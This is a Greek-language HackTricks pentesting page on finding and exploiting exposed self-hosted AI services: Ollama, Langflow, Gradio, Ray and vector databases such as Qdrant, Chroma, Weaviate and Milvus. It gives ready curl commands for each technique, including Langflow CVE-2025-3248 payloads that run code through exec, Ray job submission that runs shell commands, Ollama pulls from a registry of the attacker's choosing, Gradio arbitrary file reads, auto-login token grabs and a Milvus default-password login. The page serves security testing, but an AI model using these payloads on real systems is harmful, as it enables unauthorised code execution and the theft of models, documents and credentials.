# Εκτεθειμένες self-hosted υπηρεσίες AI

{{#include ../banners/hacktricks-training.md}}

Οι ομάδες που αναπτύσσουν λειτουργίες AI συχνά εκτελούν δικούς τους model runners, agent builders, demo UI, compute clusters και vector databases. Πολλά από αυτά τα εργαλεία σχεδιάστηκαν για laptop ή κλειστό εργαστηριακό δίκτυο, οπότε **δεν έχουν authentication από προεπιλογή** ή παρέχονται με ενεργοποιημένη συντόμευση authentication. Όταν μια τέτοια υπηρεσία είναι προσβάσιμη από τον attacker, οι επιπτώσεις συνήθως εμπίπτουν σε μία από τις εξής κατηγορίες:

- Δωρεάν χρήση GPU και μοντέλων, καθώς και κλοπή ιδιωτικών μοντέλων.
- Leakage prompts, εγγράφων και embeddings.
- Leakage secrets από το περιβάλλον της διεργασίας (κλειδιά παρόχων LLM, cloud credentials).
- Code execution, επειδή ορισμένα από αυτά τα API εκτελούν κώδικα **ως λειτουργία**.

Αυτή η σελίδα περιγράφει πώς να εντοπίσετε αυτές τις υπηρεσίες και τι να ελέγξετε σε κάθε τύπο API. Για τη θωράκιση ενός self-hosted inference server και το leak του llama.cpp `/slots`, δείτε το [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Για κακόβουλα αρχεία μοντέλων, δείτε το [AI Models RCE](AI-Models-RCE.md).

## Fingerprinting

Στείλτε αυτά τα requests χωρίς credentials. Μια απάντηση JSON με τα αναμενόμενα πεδία προσδιορίζει το προϊόν και συχνά την έκδοση, αποκαλύπτοντας ποιους από τους παρακάτω ελέγχους πρέπει να εφαρμόσετε. Οι θύρες είναι οι προεπιλεγμένες που αναφέρονται στην τεκμηρίωση ή εκείνες που χρησιμοποιούνται στα επίσημα παραδείγματα εκτέλεσης.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Προϊόν | Συνήθης θύρα | Request χωρίς authentication | Τι το αναγνωρίζει |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON με την έκδοση, λίστα τοπικών μοντέλων |
| Langflow | 7860 | `GET /api/v1/version` | JSON με την έκδοση του Langflow |
| Gradio | 7860 | `GET /config` | Config εφαρμογής με την έκδοση του Gradio και IDs components |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, λίστα υποβληθεισών εργασιών |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Τιμή heartbeat, έκδοση Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Έκδοση Qdrant, λίστα collections |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Έκδοση Weaviate, classes |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Λίστα collections ή σφάλμα authentication |

Αυτές οι υπηρεσίες συχνά δημοσιεύονται επίσης πίσω από reverse proxy, κάτω από ένα path prefix (για παράδειγμα `/ollama/` ή `/ray/`), οπότε επαναλάβετε τα requests με κάθε prefix που εντοπίζετε σε JavaScript bundles ή στην τεκμηρίωση API.

## APIs inference και διαχείρισης μοντέλων χωρίς authentication

Οι model runners συνήθως εκθέτουν ένα ενιαίο REST API που συνδυάζει routes inference με routes διαχείρισης. Το Ollama είναι ένα καλό παράδειγμα. Δεν διαθέτει ενσωματωμένο authentication και, από προεπιλογή, κάνει bind στη διεύθυνση `127.0.0.1:11434`, ενώ η `OLLAMA_HOST` αλλάζει τη διεύθυνση bind.<sup>[[1]](#references)[[15]](#references)</sup> Το επίσημο Docker image ορίζει `OLLAMA_HOST=0.0.0.0:11434` μέσα στο container, δηλώνει `EXPOSE 11434` και δεν έχει οδηγία `USER`, επομένως ο server εκτελείται ως root στο container.<sup>[[16]](#references)</sup> Το `EXPOSE` δεν δημοσιεύει τη θύρα στον host, επομένως η προσβασιμότητα από τον host εξαρτάται από το deployment. Οι τεκμηριωμένες εντολές `docker run` χρησιμοποιούν `-p 11434:11434`, και το Docker δημοσιεύει μια τέτοια αντιστοίχιση σε όλες τις διεπαφές του host, εκτός αν οριστεί IP του host.<sup>[[17]](#references)[[18]](#references)</sup>

Τι επιτρέπει στον attacker κάθε ομάδα routes:<sup>[[2]](#references)</sup>

| Routes | Επίπτωση χωρίς authentication |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Λίστα τοπικών και φορτωμένων μοντέλων, συμπεριλαμβανομένων ιδιωτικών custom μοντέλων |
| `POST /api/show` | Λεπτομέρειες μοντέλου, συμπεριλαμβανομένων του Modelfile, του template και του **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Δωρεάν inference στο hardware του θύματος |
| `POST /api/pull`, `/api/push` | Εξαναγκασμός του server να κατεβάσει από ή να ανεβάσει ένα μοντέλο σε registry που επιλέγει ο attacker |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Δημιουργία, αντικατάσταση ή διαγραφή μοντέλων |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Μια λίστα μοντέλων που επιστρέφεται χωρίς διαπιστευτήρια αποδεικνύει ήδη την έκθεση. Τα custom μοντέλα συχνά περιέχουν ένα εσωτερικό system prompt στο `/api/show`. Ένα pull προς τον host σας αποδεικνύει ότι ο server ανακτά manifests από registries που επιλέγει ο attacker. Ένα `/api/push` προς το registry σας μετατρέπει την έκθεση σε κλοπή μοντέλων. Μην καλείτε routes δημιουργίας ή διαγραφής σε πραγματικούς στόχους.

Τα pulls από registries αποτελούν επίσης επιφάνεια επίθεσης parser, επειδή ο server αποθηκεύει blobs χρησιμοποιώντας τιμές από το απομακρυσμένο manifest. Στο Probllama (CVE-2024-37032, διορθώθηκε στο Ollama 0.1.34), το `digest` του manifest χρησιμοποιούνταν ως όνομα αρχείου χωρίς επικύρωση. Έτσι, ένα κακόβουλο registry μπορούσε να γράψει αρχεία εκτός του καταλόγου blobs χρησιμοποιώντας ακολουθίες `../`. Η προώθηση ενός τεχνητά διαμορφωμένου manifest, του οποίου το digest παρέπεμπε σε ένα τοπικό αρχείο, διέρρευσε αυτό το αρχείο στο registry του attacker. Η Wiz πέτυχε RCE στο Docker, όπου ο server εκτελείται ως root, γράφοντας μια shared library και προσθέτοντάς την στο `/etc/ld.so.preload`, και στη συνέχεια καλώντας το `/api/chat`, ώστε να τη φορτώσει μια νέα διεργασία.<sup>[[15]](#references)</sup> Όταν ένας runner μπορεί να κάνει pull από αυθαίρετα registries, ελέγξτε πώς μετατρέπει τα πεδία του manifest σε paths.

## APIs που εκτελούν κώδικα εκ σχεδιασμού

### APIs υποβολής εργασιών

Τα frameworks κατανεμημένου υπολογισμού θεωρούν την εκτέλεση κώδικα βασικό χαρακτηριστικό τους. Το Ray Jobs API στη θύρα του dashboard (8265) δέχεται μια εντολή shell `entrypoint` και την εκτελεί στο cluster.<sup>[[19]](#references)</sup> Η έρευνα Oligo ShadowRay αναφέρει ότι το Jobs API δεν διαθέτει authorization και ότι το dashboard κάνει bind στο `0.0.0.0`. Η σχετική CVE-2023-48022 αμφισβητείται, επειδή το Ray αναμένεται να εκτελείται μόνο μέσα σε ελεγχόμενο δίκτυο.<sup>[[20]](#references)</sup> Το Ray πρόσθεσε προαιρετικό token authentication (`RAY_AUTH_MODE=token`) στην έκδοση 2.52.0. Το Ray 2.59 το ενεργοποιεί από προεπιλογή για τοπικά clusters που εκκινούν με `ray.init()`· το `ray start --head` μπορεί και πάλι να εκκινηθεί χωρίς authentication, αν δεν υπάρχει διαθέσιμο token. Το Ray τεκμηριώνει ευρύτερη σταδιακή ενεργοποίηση του authentication από προεπιλογή για την έκδοση 2.61, επομένως ελέγξτε την εγκατεστημένη έκδοση και τον τρόπο εκκίνησης αντί να θεωρείτε δεδομένο ότι το dashboard είναι ανοιχτό.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Πίνακες εργαλείων αυτού του είδους έχουν επίσης βοηθητικά routes που αξίζει να ελέγξετε σε παλιές εκδόσεις. Πριν από την έκδοση Ray 2.8.1, το `/log_proxy?url=` έκανε fetch οποιοδήποτε URL HTTP(S) (SSRF σε cloud metadata), ενώ το `/api/v0/logs/file` δεχόταν αυθαίρετη διαδρομή `filename`· και τα δύο χωρίς authentication.<sup>[[8]](#references)</sup>

### Endpoints «επικύρωσης» κώδικα που εκτελούν ορισμούς συναρτήσεων

Οι builders για agent που δέχονται προσαρμοσμένα στοιχεία Python μερικές φορές «επικυρώνουν» τον κώδικα αναλύοντάς τον με `ast` και εκτελώντας μόνο τους ορισμούς συναρτήσεων με `exec()`. Αυτό δεν είναι ασφαλές. Η Python αξιολογεί τους **decorators και τις προεπιλεγμένες τιμές ορισμάτων κατά τον ορισμό της συνάρτησης**, οπότε ο κώδικας που τοποθετείται εκεί εκτελείται ακόμη κι αν δεν εκτελεστεί ποτέ το σώμα της συνάρτησης. Το Langflow λειτουργούσε έτσι στο `POST /api/v1/validate/code`, το οποίο δεν απαιτούσε authentication πριν από την έκδοση 1.3.0 (CVE-2025-3248). Αν προκαλέσετε exception που περιέχει το output της εντολής, το endpoint επιστρέφει το output στην απόκριση:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Δοκιμάστε κάθε endpoint που μεταγλωττίζει, κάνει lint ή «ελέγχει» κώδικα χρήστη για αυτό το μοτίβο και προτιμήστε ένα DNS callback ως απόδειξη.

### Διαδρομές Auto-login και προεπιλεγμένου token superuser

Τα εργαλεία για έναν μόνο χρήστη συχνά διαθέτουν μια συντόμευση που συνδέει κάθε επισκέπτη ως διαχειριστή. Στο Langflow, όταν είναι ενεργοποιημένο το `AUTO_LOGIN`, το `GET /api/v1/auto_login` επιστρέφει tokens για τον προεπιλεγμένο superuser σε οποιονδήποτε caller. Όταν είναι απενεργοποιημένο, η διαδρομή απαντά `Auto login is disabled.`.<sup>[[23]](#references)</sup> Το Langflow OSS 1.0.0 έως 1.10.0 το είχε ενεργοποιημένο από προεπιλογή (CVE-2026-9103). Ο συνδυασμός του με την παραπάνω διαδρομή επικύρωσης κώδικα που απαιτεί authentication επαναφέρει το μη αυθεντικοποιημένο RCE (CVE-2026-9198).<sup>[[24]](#references)[[25]](#references)</sup> Τα τρέχοντα επίσημα πακέτα εκδόσεων και τα Docker images έχουν απενεργοποιημένο το automatic login και απαιτούν κωδικό πρόσβασης superuser, αλλά τα development branches το διατηρούν ενεργοποιημένο.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Ακόμα και χωρίς εκτέλεση κώδικα, ένα token superuser παρέχει πρόσβαση σε κάθε flow και στα αποθηκευμένα διαπιστευτήρια των παρόχων. Για σχετικό έλεγχο προαπαιτούμενων σε αυτοματοποιημένες δοκιμές, δείτε το [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Διαδρομές εξυπηρέτησης αρχείων και RPC σε ML demo UIs

Τα frameworks για ML demo εξυπηρετούν αρχεία που έχουν μεταφορτωθεί ή δημιουργηθεί μέσω μιας γενικής διαδρομής και επιτρέπουν στο frontend να καλεί βοηθητικές συναρτήσεις components στην πλευρά του server. Το Gradio εκθέτει τις διαδρομές `/config`, `/upload` και `/file=<path>` για αυτόν τον σκοπό.<sup>[[5]](#references)</sup> Σε κάθε παρόμοιο framework αξίζει να δοκιμάσετε δύο μοτίβα:

- **Traversal από υποκατάλογο μεταφόρτωσης:** αν η διαδρομή αρχείων ελέγχει μόνο ότι η διαδρομή ξεκινά μέσα στον προσωρινό φάκελο, μεταφορτώστε ένα αρχείο για να δημιουργήσετε έναν υποκατάλογο και, στη συνέχεια, ανεβείτε έξω από αυτόν με `../` ή `%2e%2e%2f`. Το Gradio 4.0 έως 4.10 (CVE-2023-51449) ήταν ευάλωτο με αυτόν τον τρόπο.<sup>[[26]](#references)[[27]](#references)</sup> Στείλτε το αίτημα με `curl --path-as-is`, ώστε ο client να μην κανονικοποιήσει τη διαδρομή.
- **Αυθαίρετη dispatch μεθόδων:** ένα endpoint που καλεί `getattr(component, fn_name)` με είσοδο του χρήστη επιτρέπει στον επιτιθέμενο να καλεί εσωτερικές βοηθητικές συναρτήσεις. Πριν από την έκδοση 4.13.0, το `/component_server` του Gradio λειτουργούσε έτσι. Στις εκδόσεις 4.3 έως 4.12, η `move_resource_to_block_cache` αντέγραφε οποιοδήποτε τοπικό αρχείο στην cache, από όπου μπορούσε να ληφθεί μέσω του `/file=`. Στις εκδόσεις 3.47 έως 3.50.2, άλλες βοηθητικές συναρτήσεις παρείχαν ανάγνωση αρχείων και SSRF πλήρους ανάγνωσης.<sup>[[26]](#references)[[28]](#references)</sup> Ένας διορθωμένος server απαντά `Function not found.` για βοηθητικές συναρτήσεις που δεν έχουν δηλωθεί ως server functions.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Στο Hugging Face Spaces, τα μυστικά του Space είναι μεταβλητές περιβάλλοντος, επομένως το `/proc/self/environ` είναι το πιο πολύτιμο αρχείο. Η Horizon3 το διάβασε με μια HTTP κεφαλίδα `Range`.<sup>[[26]](#references)</sup>

## Διανυσματικές βάσεις δεδομένων που χρησιμοποιούνται από το RAG

Το RAG αποθηκεύει τμήματα των αρχικών εγγράφων, τα embeddings τους και μεταδεδομένα σε μια διανυσματική βάση δεδομένων, και ο βοηθός τοποθετεί τα κορυφαία αποτελέσματα στο prompt του. Συνεπώς, η πρόσβαση ανάγνωσης προκαλεί leak του **απλού κειμένου ιδιωτικών εγγράφων**. Η πρόσβαση εγγραφής επιτρέπει σε έναν εισβολέα να εισάγει τμήματα που ανακτώνται αργότερα στα prompt άλλων χρηστών, κάτι που αποτελεί επίμονη έμμεση prompt injection (βλ. [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Για αυτοφιλοξενούμενες διανυσματικές βάσεις δεδομένων, ελέγξτε αν έχει ρυθμιστεί έλεγχος ταυτότητας ή αν είναι ενεργοποιημένη η ανώνυμη πρόσβαση:

- **Qdrant**: οι αυτοαναπτυγμένες παρουσίες ακούν σε όλες τις διεπαφές χωρίς έλεγχο ταυτότητας. Όταν έχει ρυθμιστεί, το κλειδί τοποθετείται στην κεφαλίδα `api-key` ή ως `Authorization: Bearer`. Μπορεί να υπάρχουν κλειδιά μόνο για ανάγνωση και κλειδιά ανά συλλογή.<sup>[[11]](#references)</sup>
- **Chroma**: ο έλεγχος ταυτότητας είναι απενεργοποιημένος από προεπιλογή. Για έλεγχο ταυτότητας με token χρησιμοποιείται το `Authorization` ή το `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: τα αιτήματα χωρίς διαπιστευτήρια πιστοποιούνται ως `user: anonymous` όταν είναι ενεργοποιημένη η ανώνυμη πρόσβαση και αποκτούν όσα δικαιώματα έχει αυτός ο χρήστης.<sup>[[30]](#references)</sup>
- **Milvus**: ο έλεγχος ταυτότητας είναι απενεργοποιημένος, εκτός αν το `common.security.authorizationEnabled` είναι `true`. Όταν είναι ενεργοποιημένος, ο προεπιλεγμένος χρήστης `root` έχει τον κωδικό πρόσβασης `Milvus` και η μορφή του token είναι `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Μια απόκριση που περιέχει ιδιωτικά δεδομένα χωρίς διαπιστευτήρια υποδεικνύει έκθεση. Όταν είναι ενεργοποιημένος ο έλεγχος ταυτότητας, αξιολογήστε ξεχωριστά τυχόν αμετάβλητο προεπιλεγμένο λογαριασμό:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Ελέγξτε αν τα payloads περιέχουν κείμενο εγγράφων, αναγνωριστικά χρηστών ή ονόματα tenant. Για να δείξετε write access χωρίς να αλλοιώσετε δεδομένα production, δημιουργήστε και διαγράψτε αμέσως μια κενή συλλογή με σαφές όνομα, και μόνο όταν το επιτρέπει το scope.

Ο έλεγχος ταυτότητας σε αυτούς τους servers μπορεί επίσης να γίνεται πολύ αργά. Στον Python FastAPI server του Chroma (1.0.0 έως τουλάχιστον 1.5.8, CVE-2026-45829), το route δημιουργίας συλλογής δημιουργούσε τη συνάρτηση ενσωμάτωσης που παρείχε ο client πριν από τον έλεγχο ταυτότητας. Μια ρύθμιση που αναφερόταν σε μοντέλο Hugging Face υπό τον έλεγχο επιτιθέμενου με `trust_remote_code: true` εκτελούσε τον κώδικα του επιτιθέμενου ακόμη κι όταν το αίτημα απορριπτόταν. Το Rust frontend δεν επηρεαζόταν.<sup>[[32]](#references)</sup> Όταν ένα αίτημα περιλαμβάνει ρυθμίσεις μοντέλου ή plugin, δοκιμάστε το χωρίς credentials και παρακολουθήστε αν γίνεται εξερχόμενη λήψη από το repository του μοντέλου σας.

## References

- [1] [Συχνές ερωτήσεις του Ollama](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Τεκμηρίωση API του Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [README του Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Πηγαίος κώδικας του Langflow - endpoints API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Πηγαίος κώδικας του Gradio - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Πηγαίος κώδικας του Gradio - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Πηγαίος κώδικας του Ray - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, εκδόσεις 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Πηγαίος κώδικας του Chroma - προεπιλογές Python client](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Πηγαίος κώδικας του Chroma - routes του FastAPI server](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Ασφάλεια](https://qdrant.tech/documentation/security/)
- [12] [Προδιαγραφή OpenAPI του Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Προδιαγραφή OpenAPI του Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Σύνδεση σε Milvus Server](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Ευπάθεια απομακρυσμένης εκτέλεσης κώδικα στο Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Dockerfile του Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Τεκμηρίωση Docker του Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Δημοσίευση και έκθεση ports](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [REST API εργασιών του Ray](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: Η πρώτη γνωστή καμπάνια επιθέσεων που στόχευσε AI workloads και αξιοποιήθηκε ενεργά στη φύση](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Έλεγχος ταυτότητας με token στο Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Μη ασφαλές με οποιαδήποτε ταχύτητα: Κατάχρηση του Python Exec για μη πιστοποιημένο RCE στο Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Πηγαίος κώδικας του Langflow - router σύνδεσης](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Εκμετάλλευση ευπαθειών ανάγνωσης αρχείων στο Gradio για υποκλοπή μυστικών από Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Συμβουλευτική ανακοίνωση του Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Commit διόρθωσης του Gradio για το `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Εγγενής έλεγχος ταυτότητας του Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Έλεγχος ταυτότητας](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Έλεγχος ταυτότητας πρόσβασης χρηστών](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - Το ChromaToast σερβιρίστηκε πριν από τον έλεγχο ταυτότητας](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
{{#include ../banners/hacktricks-training.md}}
